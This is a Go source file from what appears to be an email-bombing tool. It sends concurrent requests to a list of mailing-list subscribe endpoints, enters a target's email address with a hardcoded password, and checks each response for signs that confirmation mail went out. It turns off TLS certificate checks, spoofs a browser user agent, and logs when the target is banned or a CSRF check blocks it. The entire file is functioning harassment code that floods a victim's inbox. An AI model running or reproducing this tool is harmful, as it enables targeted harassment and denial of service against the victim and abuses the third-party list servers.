package sender

import (
	"crypto/tls"
	"fmt"
	"strings"
	"time"

	"emails.go/core/assets"
	"emails.go/core/console"
	"github.com/valyala/fasthttp"
	"github.com/zenthangplus/goccm"
)

var (
	Client = fasthttp.Client{
		ReadTimeout:  2 * time.Second,
		WriteTimeout: 2 * time.Second,
		TLSConfig:    &tls.Config{InsecureSkipVerify: true},
	}
	Password  string = "SDUHGIFSDGHFS98ETSGHG"
	LogFailed bool   = false

	UsedRefined []string
)

func SendEmails(email string, threads int, refined bool) {
	c := goccm.New(threads)
	var nodes []string

	if refined {
		nodes = *assets.RefinedNodes
	} else {
		nodes = *assets.Nodes
	}

	for index, node := range nodes {
		c.Wait()

		go func(index int, node string) {
			node = BuildURL(node, email)
			SendRequest(node, index)

			c.Done()
		}(index, node)
	}

	c.WaitAllDone()
}

func BuildURL(node string, email string) string {
	url := fmt.Sprintf("%v?email=%v&fullname=&pw=%v&pw-conf=%v&digest=0&language=en&email-button=Subscribe", node, email, Password, Password)
	return url
}

func SendRequest(node string, index int) {
	req := fasthttp.AcquireRequest()
	res := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(res)

	req.SetRequestURI(node)
	req.Header.SetMethod("GET")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0")

	err := Client.Do(req, res)
	if err != nil {
		console.Log(fmt.Sprintf("Failed to send request to node #%v%d%v", console.PrimaryColor, index, console.SecondaryColor), true)
		return
	}

	body := string(res.Body())

	if strings.Contains(body, "be acted upon") || strings.Contains(body, "Confirmation from your email") {
		console.Log(fmt.Sprintf("Successfully sent emails with node #%v%d%v", console.PrimaryColor, index, console.SecondaryColor), true)
	} else if LogFailed {
		if strings.Contains(body, "is banned") {
			console.Log(fmt.Sprintf("Your target email is banned from node #%v%d%v", console.PrimaryColor, index, console.SecondaryColor), true)
		} else if strings.Contains(body, "no hidden token") {
			console.Log(fmt.Sprintf("CSRF check required with node #%v%d%v", console.PrimaryColor, index, console.SecondaryColor), true)
		} else {
			console.Log(fmt.Sprintf("Failed on node #%v%d%v", console.PrimaryColor, index, console.SecondaryColor), true)
		}
	}
}
